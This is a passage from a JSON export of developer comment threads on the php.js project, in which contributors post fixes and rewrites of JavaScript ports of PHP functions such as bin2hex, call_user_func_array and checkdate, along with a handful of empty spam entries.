str;\n}\n[\/CODE]"},{"date":"2011-07-26 19:09:12","author":"Dj","url":"","comment":"A fix to my previous post:\nThe last character in the last regexp should be an '*' instead of the '?':\n\nReplace: \n\n[CODE]var str = (path + '').replace(\/^[\\\/\\\\]+$\/, '').replace(\/^.*[\\\/\\\\]([^\\\/\\\\]+)[\\\/\\\\]?\/g, '$1');[\/CODE]\n\nWith:\n[CODE]var str = (path + '').replace(\/^[\\\/\\\\]+$\/, '').replace(\/^.*[\\\/\\\\]([^\\\/\\\\]+)[\\\/\\\\]*\/g, '$1');[\/CODE]"},{"date":"2012-04-18 10:16:57","author":"??????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"They have done such a great job with this. This is why they are deserving of these awards. Keep up the good work\n"}],"bin2hex":[{"date":"2008-05-09 17:40:19","author":"Greg Copenhaver","url":"","comment":"I attempted to use your bin2hex() function, but had a problem with it in my situation (Javascript LM hashes - http:\/\/gcopenhaver.com\/node\/94).  Some characters in the string that I was passing to were 0x0f and lower, and this function does not include the first '0' for any of those, causing problems if it's not at the beginning of the string.  Here's a function from http:\/\/tero.co.uk\/des\/code.php that will include the '0' if a byte is 0x0f or less.  In my use, I removed the '0x' prefix that was set in this function.  This is the code as copied from the des.js file.  I don't know anything about the licensing of this code.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction stringToHex (s) {\r\n  var r = &quot;0x&quot;;\r\n  var hexes = new Array (&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;);\r\n  for (var i=0; i&lt;s.length; i++) {r += hexes [s.charCodeAt(i) &gt;&gt; 4] + hexes [s.charCodeAt(i) &amp; 0xf];}\r\n  return r;\r\n}\r\n[\/CODE]"},{"date":"2008-11-18 16:34:10","author":"Linuxworld","url":"","comment":"Hello Kevin,\r\n\r\nFirst, nice job and big thanks for sharing this kind of stuff: JS and PHP worth to be closer thanks to equivalents.\r\n\r\nBefore fixing your bin2hex function that were not working in my case, I have used one of http:\/\/www.paulschou.com\/tools\/xlate\/ that works fine on php side but translated with your js equivalents gave a string with NaN and zeroes..\r\n\r\nYour version of bin2hex is buggy and returns a shorter string length due to missing prepending zeroes for low bytes (ie those of value &lt; 0x10). Note that an user has provided a patched version of ord that seems to take this into acccount and with this one, Paul schou's bin2hex equivalent may work on the js side.\r\n\r\nHere is the patched and commented version, Enjoy.                        Linuxworld\r\n\r\n       \/**\r\n\t*@name bin2hex\r\n\t*@brief  Convert binary data into hexadecimal representation\r\n\t*@version 2.0\r\n\t*@requires str_repeat \r\n\t*@note \r\n\t*\tV1.0 - original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n\t*\tV1.1 - bugfixed by: Onno Marsman\r\n\t*\tV2.0 (18.11.2008) 2 digits for low bytes fix by Linuxworld \r\n\t*@see http:\/\/kevin.vanzonneveld.net\/techblog\/article\/javascript_equivalent_for_phps_bin2hex\/\r\n\t*@internal Similar to recursive ord or encodeuri without %. Be warned encodeuri or encodeuricomponent\r\n\t* are buggy on both JS\/PHP sides. An attempt to reproduce encodeUri was made here  http:\/\/www.captain.at\/howto-php-urlencode-javascript-decodeURIComponent.php but its encoding\/decoding \r\n\t*table is incomplete and thus not as much reliable than bin2hex.\r\n\t* For all escaping stuff to retrieve hex values: http:\/\/xkr.us\/articles\/javascript\/encode-compare\/\r\n\t*@example \r\n\t*\texample 1: bin2hex('Kev');\r\n\t*\t returns 1: '4b6576'\r\n\t*@param String s a binary string (ie one given after base64_decode call for sample)\r\n\t*@return String the hexadecimal representation of the given string.\r\n\t**\/\r\n\tfunction bin2hex(s){\r\n\t\t\r\n\t\tvar v,i, f = 0, a = [];\r\n\t\ts += '';\r\n\t\tf = s.length;\r\n\t\tfor(i = 0; i&lt;f; i++){\r\n                        v= s.charCodeAt(i).toString(16);\r\n\t\t\ta[i] =str_repeat(&quot;0&quot;, 2-v.toString().length)+v; \/\/ensures 2 digit code for bytes!\r\n\t\t}\r\n\t\treturn a.join('');\r\n\t}"},{"date":"2008-11-18 16:34:54","author":"Linuxworld","url":"","comment":"Hello Kevin,\r\n\r\nFirst, nice job and big thanks for sharing this kind of stuff: JS and PHP worth to be closer thanks to equivalents.\r\n\r\nBefore fixing your bin2hex function that were not working in my case, I have used one of http:\/\/www.paulschou.com\/tools\/xlate\/ that works fine on php side but translated with your js equivalents gave a string with NaN and zeroes..\r\n\r\nYour version of bin2hex is buggy and returns a shorter string length due to missing prepending zeroes for low bytes (ie those of value &lt; 0x10). Note that an user has provided a patched version of ord that seems to take this into acccount and with this one, Paul schou's bin2hex equivalent may work on the js side.\r\n\r\nHere is the patched and commented version, Enjoy.                        Linuxworld\r\n\r\n       \/**\r\n\t*@name bin2hex\r\n\t*@brief  Convert binary data into hexadecimal representation\r\n\t*@version 2.0\r\n\t*@requires str_repeat \r\n\t*@note \r\n\t*\tV1.0 - original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n\t*\tV1.1 - bugfixed by: Onno Marsman\r\n\t*\tV2.0 (18.11.2008) 2 digits for low bytes fix by Linuxworld \r\n\t*@see http:\/\/kevin.vanzonneveld.net\/techblog\/article\/javascript_equivalent_for_phps_bin2hex\/\r\n\t*@internal Similar to recursive ord or encodeuri without %. Be warned encodeuri or encodeuricomponent\r\n\t* are buggy on both JS\/PHP sides. An attempt to reproduce encodeUri was made here  http:\/\/www.captain.at\/howto-php-urlencode-javascript-decodeURIComponent.php but its encoding\/decoding \r\n\t*table is incomplete and thus not as much reliable than bin2hex.\r\n\t* For all escaping stuff to retrieve hex values: http:\/\/xkr.us\/articles\/javascript\/encode-compare\/\r\n\t*@example \r\n\t*\texample 1: bin2hex('Kev');\r\n\t*\t returns 1: '4b6576'\r\n\t*@param String s a binary string (ie one given after base64_decode call for sample)\r\n\t*@return String the hexadecimal representation of the given string.\r\n\t**\/\r\n\tfunction bin2hex(s){\r\n\t\t\r\n\t\tvar v,i, f = 0, a = [];\r\n\t\ts += '';\r\n\t\tf = s.length;\r\n\t\tfor(i = 0; i&lt;f; i++){\r\n                        v= s.charCodeAt(i).toString(16);\r\n\t\t\ta[i] =str_repeat(&quot;0&quot;, 2-v.toString().length)+v; \/\/ensures 2 digit code for bytes!\r\n\t\t}\r\n\t\treturn a.join('');\r\n\t}"},{"date":"2008-11-22 16:55:51","author":"Linuxworld","url":"","comment":"Sorry for the previous duplicates, here is the optimized version (ie shorter, with no more str_repeat dependency):\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction bin2hex(s){\r\n\t\t\/\/ http:\/\/kevin.vanzonneveld.net\r\n\t\t\/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n\t\t\/\/ +   bugfixed by: Onno Marsman\r\n\t\t\/\/ +   bugfixed by:  Linuxworld (v2) \r\n\t\t\/\/ *     example 1: bin2hex('Kev');\r\n\t\t\/\/ *     returns 1: '4b6576'\r\n\t\t\r\n\t\tvar v,i, f = 0, a = [];\r\n\t\ts += '';\r\n\t\tf = s.length;\r\n\t\tfor(i = 0; i&lt;f; i++){\r\n                        a[i] = s.charCodeAt(i).toString(16).replace(\/^(\\d)$\/,&quot;0$1&quot;);\r\n\t\t}\r\n\t\treturn a.join('');\r\n\t}\r\n[\/CODE]\r\n\r\n    Now, alert(bin2hex(String.fromCharCode(0x00))) gives 00 which is the expected result."},{"date":"2008-11-22 19:07:49","author":"Linuxworld","url":"","comment":"Hum, lacks a-f range in the previous snippet,\r\nHope this time is the good one.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction bin2hex(s){\r\n\t\t\/\/ http:\/\/kevin.vanzonneveld.net\r\n\t\t\/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n\t\t\/\/ +   bugfixed by: Onno Marsman\r\n\t\t\/\/ +   bugfixed by:  Linuxworld (v2) \r\n\t\t\/\/ *     example 1: bin2hex('Kev');\r\n\t\t\/\/ *     returns 1: '4b6576'\r\n\t\t\r\n\t\tvar v,i, f = 0, a = [];\r\n\t\ts += '';\r\n\t\tf = s.length;\r\n\t\tfor(i = 0; i&lt;f; i++){\r\n                        a[i] = s.charCodeAt(i).toString(16).replace(\/^([\\da-f])$\/,&quot;0$1&quot;);\r\n\t\t}\r\n\t\treturn a.join('');\r\n\t} \r\n[\/CODE]"},{"date":"2008-11-25 17:03:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Linuxworld: Thanks a lot for your thorough contribution!"},{"date":"2010-04-12 23:47:06","author":"Max","url":"","comment":"Hi all !\n\nI think there is a bug with some characters in the bin2hex function.\n\nFor example, with this char : \"\u0152\" i have the hex : \"152\"\n\nand it should be \"008c\" ?\nhttp:\/\/www.fileformat.info\/info\/unicode\/char\/008c\/index.htm\n\n\"152\" is not an hexadecimal code ?\n\nAnd it's the same problem with these letters : \u0160 \u0161 \u017d \u017e \u0152 \u0153 \u0178\n\nThanks !"},{"date":"2010-04-13 04:35:24","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Hello Max! Actually, the character referred to on that page is in fact a control character, not the character that it shows. It appears that they may be rendered at that site with that appearance because Windows-1252 does define the character at that code point as in fact being that Latin ligature: http:\/\/en.wikipedia.org\/wiki\/Windows-1252#Codepage_layout . If you consult http:\/\/www.unicode.org\/charts\/PDF\/U0080.pdf , you can confirm that the character is not supposed to be rendered the way it is on the page you have cited, while you can see at http:\/\/www.unicode.org\/charts\/PDF\/U0100.pdf that U+152 is the one it is showing. \n\nHowever, if you go to their \"browser test page\", even though you can't see the character in Firefox, if you copy the hidden character there (minus the surrounding spaces and tabs) and use it in the bin2hex function, you'll see that it returns '8c'.\n\nSo the behavior of the function is correct. FYI, if you're using Firefox, my extension at https:\/\/addons.mozilla.org\/en-US\/firefox\/addon\/5235 will let you find the definitions of characters similar to that site and some of the other information it contains, with characters rendered as is, or also available with a transcluded image from the Unicode site itself so you can see how it is supposed to look. And if you are seeking for the real characters, you can use the extension to search by character name, e.g., to search for \"oe\", you'll turn up U+152 in the chart view.\n\nAlso, FYI, many people confuse Windows-1252 with Latin-1 (ISO-8859-1) to such an extent that even browsers do so, and now the HTML5 draft is purposely defining Latin-1 to map to Windows-1252: http:\/\/www.whatwg.org\/specs\/web-apps\/current-work\/multipage\/parsing.html#character-encodings-0 ! To avoid the confusion and get all kinds of other benefits, always use Unicode..."},{"date":"2012-05-13 17:05:03","author":"Anonymous","url":"","comment":"Sorry but this not work for convert binaries numbers to hexadecimal numbers. WTF! Try convert \"10100101\"... your function return \"3130313030313031\" (but the correct answer is \"A5\")."},{"date":"2012-06-29 16:50:11","author":"ntoniazzi","url":"","comment":"This one is about 50% faster :\n[code]\nfunction bin2hex(s) {\n    var i, m, o = \"\", n;\n    \n    for (i = 0, m = s.length; i< m; i++) {\n        n = s.charCodeAt(i).toString(16)\n        o += n.length < 2 ? \"0\" + n : n;\n    }\n    \n    return o;\n}\n[\/code]"},{"date":"2012-06-29 23:38:44","author":"Rafa?","url":"","comment":"@ntoniazzi: thanks for the improvement. It's now on git (https:\/\/github.com\/kvz\/phpjs\/commit\/fe540ca0f15a4127204ba7615f64fcaafb33c81f). If you want to have something else than your nick (ntoniazzi) in the \"credit\" section, please contact me."},{"date":"2012-07-04 16:56:02","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Anonymous: Our function is returning what PHP also returns in your example. The PHP function is based on the byte value of the string--i.e., concatening the hex value of each character byte one byte at a time instead of treating the input string characters as individual bits.\n\nOurs is also, though based on the value of each UTF-16 character as used by JavaScript (internally--as opposed to the character encoding of the page which can (and should) be UTF-8) rather than trying to treat JavaScript strings as UTF-8 multiple byte values as PHP treats them.\n\nIf you need the latter behavior, that can be achieved by:\n\n[CODE]\nfunction bin2hex (s) {\n    return encodeURIComponent(s+'').replace(\/%\/g, '').toLowerCase();    \n}\n[\/CODE]\n\nIf you want your functionality in the PHP way (and thus php.js way), you can use:\n\n[CODE]dechex(bindec('10100101'))[\/CODE]\n\nwhich will give \"a5\" lower case (as in PHP)."}],"call_user_func":[{"date":"2009-01-31 06:57:30","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi Kevin,\r\n\r\ncall_user_method() and call_user_method_array() are now deprecated in PHP in favor of call_user_function (with the array argument). Do you want to move to not porting, or use the following?\r\n\r\n[CODE=&quot;Javascript&quot;]function call_user_method(method, obj) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Brett Zamir\r\n\r\n    var func = eval(obj+&quot;['&quot;+method+&quot;']&quot;);\r\n    \r\n    if (typeof func != 'function') {\r\n        throw new Exception(func + ' is not a valid method');\r\n    }\r\n \r\n    return func.apply(null, Array.prototype.slice.call(arguments, 2));\r\n}\r\n\r\n\r\nfunction call_user_method_array(method, obj, params) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Brett Zamir\r\n\r\n    var func = eval(obj+&quot;['&quot;+method+&quot;']&quot;);\r\n    \r\n    if (typeof func != 'function') {\r\n        throw new Exception(func + ' is not a valid method');\r\n    }\r\n \r\n    return func.apply(null, params);\r\n}[\/CODE]"},{"date":"2009-01-31 07:45:46","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Also, for get_declared_interfaces() and interface_exists() (and class_implements() but you don't seem to have these in your imported list: http:\/\/cn.php.net\/manual\/en\/ref.spl.php -- btw, is it easy to say which modules you included\/excluded?), since JavaScript offers no formal way to implement interfaces, do you want to move these to not porting? We could implement our own interface system (which even checked the number of arguments, etc.) and which worked with these PHP-named functions, but I presume that is beyond your intended scope here (though it would be pretty cool to pseudo-standardize on an interface system for JavaScript, at least until JS 2.0).\r\n\r\nOff the topic, as far as the php_js global, in the namespaced version of PHP.JS, you could put that at the top of the (function())() closure namespacing, so it wasn't actually global.\r\n\r\nAnd another off-the-topic, https:\/\/wiki.mozilla.org\/Labs\/JS_Modules , they state there &quot;If you would like to contribute a new module, get in touch with us at #labs!&quot;, so at whatever point you think we have something, we can submit a PHP-JS module for Mozilla so a bunch of extensions (and the same extension) could be able to reuse the module without any additional loading cost!"},{"date":"2009-01-31 11:44:54","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's another.... get_class_method(). I've left comments on how to get only the &quot;class methods&quot; as typically used in JavaScript (as opposed to PHP) terminology (i.e., not privileged or prototype methods, but those in the class &quot;namespace&quot;).\r\n\r\n[CODE=&quot;Javascript&quot;]function Myclass () {this.privMethod = function(){}}\r\nMyclass.classMethod = function () {}\r\nMyclass.prototype.myfunc1 = function () {\r\n    return(true);\r\n};\r\nMyclass.prototype.myfunc2 = function () {\r\n    return(true);\r\n}\r\n\r\nalert(get_class_methods('Myclass')); \/\/ classMethod,myfunc1,myfunc2\r\nvar myClassObj = new Myclass();\r\nalert(get_class_methods(myClassObj));\r\n\r\n\r\nfunction get_class_methods (name) {\r\n    var constructor, retArr=[];\r\n    if (typeof name === 'function') {\r\n        constructor = name;\r\n    }\r\n    else if (typeof name === 'string') {\r\n        constructor = window[name];\r\n    }\r\n    else if (typeof name === 'object') {\r\n        constructor = name;\r\n        for (var method in constructor.constructor) { \/\/ Get class methods of object's constructor\r\n            if (typeof constructor.constructor[method] === 'function') {\r\n                retArr.push(method);\r\n            }\r\n        }\r\n        \/\/ return retArr; \/\/ Uncomment to behave as &quot;class&quot; is usually defined in JavaScript convention (and see comment below)\r\n    }\r\n    for (var method in constructor) {\r\n        if (typeof constructor[method] === 'function') {\r\n            retArr.push(method);\r\n        }\r\n    }\r\n     \/\/ Comment out this block to behave as &quot;class&quot; is usually defined in JavaScript convention (and see comment above)\r\n    for (var method in constructor.prototype) {\r\n        if (typeof constructor.prototype[method] === 'function') {\r\n            retArr.push(method);\r\n        }\r\n    }\r\n    return retArr;\r\n}[\/CODE]"},{"date":"2009-01-31 13:06:40","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, just realized that get_class_method() returns an associative array. Here it is again, along with get_class_vars() and get_object_vars():\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction Myclass () {this.privMethod = function(){}}\r\nMyclass.classMethod = function () {}\r\nMyclass.prototype.myfunc1 = function () {\r\n    return(true);\r\n};\r\nMyclass.prototype.myfunc2 = function () {\r\n    return(true);\r\n}\r\n\r\nwhatIs(get_class_methods('Myclass'));\r\nvar myClassObj = new Myclass();\r\nwhatIs(get_class_methods(myClassObj));\r\n\r\n\r\nfunction get_class_methods (name) {\r\n    var constructor, retArr={};\r\n    if (typeof name === 'function') {\r\n        constructor = name;\r\n    }\r\n    else if (typeof name === 'string') {\r\n        constructor = window[name];\r\n    }\r\n    else if (typeof name === 'object') {\r\n        constructor = name;\r\n        for (var method in constructor.constructor) { \/\/ Get class methods of object's constructor\r\n            if (typeof constructor.constructor[method] === 'function') {\r\n                retArr[method] = constructor.constructor[method];\r\n            }\r\n        }\r\n        \/\/ return retArr; \/\/ Uncomment to behave as &quot;class&quot; is usually defined in JavaScript convention (and see comment below)\r\n    }\r\n    for (var method in constructor) {\r\n        if (typeof constructor[method] === 'function') {\r\n            retArr[method] = constructor[method];\r\n        }\r\n    }\r\n     \/\/ Comment out this block to behave as &quot;class&quot; is usually defined in JavaScript convention (and see comment above)\r\n    for (var method in constructor.prototype) {\r\n        if (typeof constructor.prototype[method] === 'function') {\r\n            retArr[method] = constructor.prototype[method];\r\n        }\r\n    }\r\n    return retArr;\r\n}[\/CODE]\r\n\r\nand:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction Myclass () {this.liveProp = 'prop';}\r\nMyclass.classProp = 'classPropVal';\r\nMyclass.prototype.myprop1 = 1;\r\nMyclass.prototype.myprop2 = 2;\r\n \r\nwhatIs(get_class_vars('Myclass'));\r\nvar myClassObj = new Myclass();\r\nmyClassObj.prototype = {a:'b'};\r\n   \r\n \r\nfunction get_class_vars (name) {\r\n    var constructor, retArr={};\r\n    if (typeof name === 'function') {\r\n        constructor = name;\r\n    }\r\n    else if (typeof name === 'string') {\r\n        constructor = window[name];\r\n    }\r\n    for (var method in constructor) {\r\n        if (typeof constructor[method] !== 'function' &amp;&amp; method !== 'prototype') {\r\n            retArr[method] = constructor[method];\r\n        }\r\n    }\r\n     \/\/ Comment out this block to behave as &quot;class&quot; is usually defined in JavaScript convention\r\n    for (var method in constructor.prototype) {\r\n        if (typeof constructor.prototype[method] !== 'function') {\r\n            retArr[method] = constructor.prototype[method];\r\n        }\r\n    }\r\n    return retArr;\r\n}\r\n\r\n\r\nfunction get_object_vars (obj) {\r\n    var retArr={};\r\n\r\n    for (var prop in obj) {\r\n        if (typeof obj[prop] !== 'function' &amp;&amp; prop !== 'prototype') {\r\n            retArr[prop] = obj[prop];\r\n        }\r\n    }\r\n    for (var prop in obj.prototype) {\r\n        if (typeof obj.prototype[prop] !== 'function') {\r\n            retArr[prop] = obj.prototype[prop];\r\n        }\r\n    }\r\n    return retArr;\r\n}[\/CODE]"},{"date":"2009-01-31 13:09:33","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, also realized the new one I just submitted now for get_class_vars() should have variable names changed to reflect the behavior of this function:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction get_class_vars (name) {\r\n    var constructor, retArr={};\r\n    if (typeof name === 'function') {\r\n        constructor = name;\r\n    }\r\n    else if (typeof name === 'string') {\r\n        constructor = window[name];\r\n    }\r\n    for (var prop in constructor) {\r\n        if (typeof constructor[prop] !== 'function' &amp;&amp; prop !== 'prototype') {\r\n            retArr[prop] = constructor[prop];\r\n        }\r\n    }\r\n     \/\/ Comment out this block to behave as &quot;class&quot; is usually defined in JavaScript convention\r\n    for (var prop in constructor.prototype) {\r\n        if (typeof constructor.prototype[prop] !== 'function') {\r\n            retArr[prop] = constructor.prototype[prop];\r\n        }\r\n    }\r\n    return retArr;\r\n}[\/CODE]"},{"date":"2009-02-01 22:55:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: They keep giving me \r\n\r\n[CODE=&quot;Javascript&quot;]\r\nException in thread &quot;Thread-0&quot; org.mozilla.javascript.EcmaError: TypeError: Cannot read property &quot;prototype&quot; from undefined\r\n[\/CODE]\r\n\r\n..errors, even when I check for prototype first. Rhino issue maybe.\r\n\r\nConcidering the functions that are in unported\/notporting, etc. That has never been a scientific process. It was the result of a sleepless night of crawling php.net. It has never been more than a rough guideline and has always been open to suggestions.\r\n\r\nBringing me to SPL. I think that may be taking it to another level. That can be a good or a bad thing, but I think for now we should focus on the normal functions &amp; the site of the project. But that's my humble opinion, I'm open to ideas.\r\n\r\nbtw I think we should move deprecated functions to _notporting, so that's what I did for now. \r\n\r\nAs far as the Mozilla thing goes. I have actually never made an extension or anything but Yeah it would be cool if we're included at some point. I don't know if they're interested or anything, but no harm in asking, right?\r\nI do think we should further professionalize PHP.JS before taking such steps though.\r\n\r\nIn my eyes mainly meaning:\r\n - bugfixing\r\n - porting more _unported\r\n - making everything associative-aware\r\n - move out the development process to phpjs.org\r\n - deciding on a good 'default' package that doesn't contain any controversial functions"},{"date":"2009-02-06 17:32:31","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"I don't know about the errors with Rhino, but maybe that is due to going through window properties?\r\n\r\nI concur with your steps of waiting to build a module, and might suggest also waiting for all arguments to be implemented (unless impossible) for any completed functions.\r\n\r\nIs it ok for me to move interface_exists() and get_declared_interfaces() (and to add class_implements()) to not porting? JavaScript has no built-in interfaces, so we could not implement these without adding our own language constructs to JavaScript."},{"date":"2009-02-11 02:21:13","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Yeah sounds good! I will need to do some work on the tester soon. But first the phpjs.org site! The online compiler is coming along nicely have you seen it?"},{"date":"2011-08-04 07:53:40","author":"Bemjuple2008","url":"","comment":""},{"date":"2011-08-07 23:22:49","author":"Ralkekaltep1976","url":"","comment":""},{"date":"2011-08-09 03:39:56","author":"Rhiccadssaria1995","url":"","comment":""},{"date":"2011-08-10 00:30:07","author":"glymninitty2005","url":"","comment":""},{"date":"2011-10-10 01:43:17","author":"ZL@B","url":"","comment":""},{"date":"2011-12-08 01:21:48","author":"Toilbonsill","url":"","comment":""},{"date":"2011-12-08 15:15:45","author":"Toilbonsill","url":"http:\/\/orskyl26.tk\/","comment":""},{"date":"2011-12-13 14:52:25","author":"ganiselim","url":"","comment":""},{"date":"2011-12-14 02:44:13","author":"sametikaresi","url":"http:\/\/kethough51.tk\/","comment":""},{"date":"2011-12-14 08:24:54","author":"ganiselim","url":"http:\/\/unin62.tk\/","comment":""},{"date":"2011-12-15 08:57:44","author":"mashikseli","url":"","comment":""},{"date":"2011-12-16 14:12:43","author":"gunsilie","url":"","comment":""},{"date":"2011-12-17 11:40:45","author":"mashikseli","url":"http:\/\/googdi57.tk\/","comment":""},{"date":"2011-12-26 18:24:18","author":"henryfikse","url":"http:\/\/opitmami.ru\/","comment":""}],"call_user_func_array":[{"date":"2008-08-05 15:32:26","author":"Jon Hohle","url":"","comment":"Here is a cleaner version of call_user_func_array which uses Function:apply. It takes string arg functions or function objects. Because of scoping issues, however, this may behave differently then the method posted above:\r\n\r\ncall_user_func_array = function(func, parameters) {\r\n    if (typeof func == 'string') {\r\n        if (typeof this[func] == 'function') { func = this[func]; }\r\n        else {\r\n            func = (new Function(null, 'return ' + func))();\r\n        }\r\n        if (typeof func != 'function') {\r\n            throw new Exception(func + ' is not a valid function');\r\n        }\r\n    }\r\n    return func.apply(null, parameters);\r\n}"},{"date":"2008-08-27 17:06:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jon Hohle: Very good work Jon Hohle! Your version will be included!"},{"date":"2008-12-20 11:49:24","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi,\r\n\r\nFirst, here's a revision. I have a number of differences in mine, some perhaps for better or worse.\r\n\r\n1) I can't see any need for the check &quot;if (typeof this[func] == 'function') {&quot;\r\n2) Although 'eval' is not in vogue, I know, the Function constructor is also subject to eval() issues too, so I just used eval().\r\n3) I didn't see any need for &quot;throw new Exception(func + ' is not a valid function');&quot; in the code posted here, since it would already be a function.\r\n4) I allowed a PHP-style array to be given as the callback to supply a object+method (as in the call_user_func() PHP documentation)\r\n\r\n[CODE=&quot;Javascript&quot;]function call_user_func_array (cb, arr) {\r\n    if (typeof cb === 'string') {\r\n        cb = eval(cb);\r\n    }\r\n    else if (cb instanceof Array) {\r\n        cb = eval(cb[0]+&quot;['&quot;+cb[1]+&quot;']&quot;);\r\n    }\r\n    cb.apply(null, arr);\r\n}[\/CODE]\r\n\r\nAnd then, here's a new one, call_user_func():\r\n\r\n[CODE=&quot;Javascript&quot;]function call_user_func (cb) {\r\n    if (typeof cb === 'string') {\r\n        cb = eval(cb);\r\n    }\r\n    else if (cb instanceof Array) {\r\n        cb = eval(cb[0]+&quot;['&quot;+cb[1]+&quot;']&quot;);\r\n    }\r\n    cb.apply(null, Array.prototype.slice.call(arguments, 1));\r\n}[\/CODE]\r\n\r\nWorks with objects, and regular functions, whether as strings, arrays, or functions."},{"date":"2008-12-30 10:58:07","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Yes eval is evil so we'll try to minimize it's use as much as possible, I've made some minor adjustments, let me know if it's ok."},{"date":"2010-04-28 13:54:02","author":"Diplom@t","url":"difane.com","comment":"Function didn't work for me when i've tried to call it like:\nvar ma = new A();\ncall_ser_func_array( array(ma, \"foo\"), [x] );\nAn error was thrown:\n\"Syntax error: Missing ] after element list\" pointing on the line with eval.\n\nI have modified the function like one below and it works now:\n    \n    var func;\n\n    if (typeof cb == 'string') {\n        if (typeof this[cb] == 'function') {\n            func = this[cb];\n        } else {\n            func = (new Function(null, 'return ' + cb))();\n        }\n    } else if (cb instanceof Array) {\n        if ( typeof cb[0] == 'string' ) {\n            func = eval(cb[0]+\"['\"+cb[1]+\"']\");\n        } else {\n            func = cb[0][cb[1]];\n        }\n    }\n    \n    if (typeof func != 'function') {\n        throw new Error(func + ' is not a valid function');\n    }\n\n    if ( typeof cb[0] == 'string' ) {\n      return func.apply(null, parameters);\n    } else {\n      return func.apply(cb[0], parameters);\n    }"},{"date":"2010-04-28 18:41:56","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Diplom@t : Very helpful patch, thank you. I've simplified a bit using the conditional operator and applied against the object when the object is specified as a string (in an array). Feel free to review the changes at http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/funchand\/call_user_func_array.js and http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/funchand\/call_user_func.js"},{"date":"2012-08-04 07:10:30","author":"legatee322","url":"","comment":""}],"checkdate":[{"date":"2008-03-31 23:07:46","author":"Przemek","url":"","comment":"(\" - double quote) also. It gives &amp;quot;. But you can fix it yourself by just moving\n\n[code]\n\tif (useQuoteStyle != 'ENT_NOQUOTES') {\n        entities['34'] = '&quot;';\n    }\n \n    if (useQuoteStyle == 'ENT_QUOTES') {\n        entities['39'] = '&#039;';\n    }\n[\/code]\n\nat the end of the table in get_html_translation_table"},{"date":"2008-04-02 13:56:16","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Dominique: Hi, I've added your example date and tried to reproduce it here: http:\/\/kevin.vanzonneveld.net\/pj_tester.php\r\n\r\nBut the checkdate examples all give the expected output here. Is this the same for you?"},{"date":"2008-04-03 03:43:49","author":"Dominique","url":"","comment":"Hello Kevin,  and thank you for your answer. \r\nPart of my comment was mistaken, but part of it still &quot;sticks&quot;. \r\nIn my test, I used \r\n[CODE=&quot;Javascript&quot;]\r\nmyDate.getYear()\r\n[\/CODE]\r\ninstead of \r\n[CODE=&quot;Javascript&quot;]\r\nmyDate.getFullYear()\r\n[\/CODE]\r\nWhich explains the strange value given for the year... \r\nBut with respect to \r\n[CODE=&quot;Javascript&quot;]\r\nmyDate.setFullYear( 2008, 03, 31);\r\nalert(myDate.getFullYear()+ &quot; &quot; + myDate.getMonth() + &quot; &quot; +myDate.getDate());\r\n[\/CODE]\r\ngiving 2008 04 01 as an answer, I persist: I definitely get that result. \r\nReading the Javascript specifications it is not surprising since it states that &quot;setFullYear&quot; takes a month parameter going from 0 to 11, so it considers month 03 to be april (which has 30 days) and hence the 31st of April to be actually the 1st of May (month 04)... \r\nSo, if the code you post is the actual checkdate code, I do not understand how it could give the right answer... I am puzzled."},{"date":"2008-04-03 08:44:12","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Dominique: You're right it does work with ranges from 0-11. Confusingly enough, getMonth also works with ranges from 0-11, so that compensated somewhat for the behaviour. But a third bug was this:\r\n[CODE=&quot;Javascript&quot;]\r\nreturn ( myDate.getMonth() != month );\r\n[\/CODE]\r\n\r\ninstead of this\r\n[CODE=&quot;Javascript&quot;]\r\nreturn ( myDate.getMonth() == month );\r\n[\/CODE]\r\n\r\nSo that made testing unreliable. Thanks for persisting in this matter! The function is fixed now."},{"date":"2008-08-14 18:04:15","author":"Pyerre","url":"","comment":"i found a bug\r\ncheckdate(1,390,2000) returns true\r\nbecause setFullYear will add the 390 days to the date but the month will be the same\r\n\r\nyou can make return ((myDate.getMonth()+1) == month &amp;&amp; day&lt;32);\r\n\r\ngood trip in Amsterdam"},{"date":"2008-08-27 18:20:45","author":"Kevin van 